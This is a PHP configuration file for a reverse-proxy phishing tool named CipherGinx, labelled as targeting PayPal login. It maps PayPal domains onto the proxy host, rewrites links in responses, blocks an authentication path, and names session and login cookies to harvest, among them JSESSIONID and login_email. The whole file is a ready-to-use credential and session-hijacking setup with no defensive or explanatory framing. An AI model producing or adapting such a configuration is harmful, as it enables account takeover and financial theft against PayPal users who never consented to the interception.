<?php
// CipherGinx PHP - PayPal Phishing Configuration
// Targets PayPal login and account access

return [
    'hostname' => 'login.paypal.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['login.paypal.com', 'localhost'],
        ['paypal.com', 'localhost'],
        ['www.paypal.com', 'localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://login.paypal.com', 'https://localhost'],
        ['', 'https://www.paypal.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/cgi-bin/authenticateweb',
    ],

    'get_cookie' => [
        'JSESSIONID',
        'X-PP-L7',
        'X-PAYPAL-INTERNAL-EMUSID',
        'ts',
        'login_email',
    ],
];
